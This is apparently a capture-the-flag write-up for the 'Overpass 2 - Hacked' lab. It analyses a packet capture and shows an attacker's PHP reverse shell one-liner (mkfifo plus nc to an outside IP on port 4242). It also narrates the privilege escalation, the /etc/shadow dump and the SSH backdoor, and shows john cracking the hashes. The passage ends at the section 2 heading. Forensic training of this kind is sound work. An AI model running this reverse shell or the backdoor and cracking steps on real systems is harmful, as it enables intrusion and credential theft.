# Overpass 2 - Hacked
Overpass has been hacked! Can you analyse the attacker's actions and hack back in?

---

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

---

### 1 - Forensics - Analyse the PCAP

One of the best practices to analyze pcap files is to follow TCP streams and see what data is being exchanged over which protocol and so on.

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/190a6772-f0ea-4206-a3b1-1659c80eac41)


To navigate more easily between streams, use the stream field in the bottom right corner of the stream window.\
We can see that in stream 1, the attacker is uploading a php file to `/development/`. Based on the content of the file, the payload is php reverse shell.
```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

TCP stream number 2 shows that the attacker requested the malicious php file to get that reverse shell.

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/e064e9a8-1c86-4605-8d01-322031992d2b)

Moving to stream number 3. This is where we can see the full action of the attacker once got a foothold into the machine.

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/4ed1baa0-b59f-404c-9d65-a32f1a479b5f)

The attacker first switched to James' account to which he has access to the password. Then he listed commands that can be executed by James with root privileges (`sudo -l`). Because James can execute whatever command as root (bad practice), the attacker was able to dump all password hashes from `/etc/shadow` and install an `ssh-backdoor` for persistence. The backdoor runs an SSH server on port 2222 that the attacker can connect to as he possesses a valid RSA private key.

Back to the password hashes, we can crack 4 of them using the `fasttrack` wordlist.
```
$ john hashes.txt -wordlist:fasttrack.txt 

Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secuirty3        (paradox)
abcd123          (szymex)
secret12         (bee)
1qaz2wsx         (muirland)
```

### 2 - Research - Analyse the code


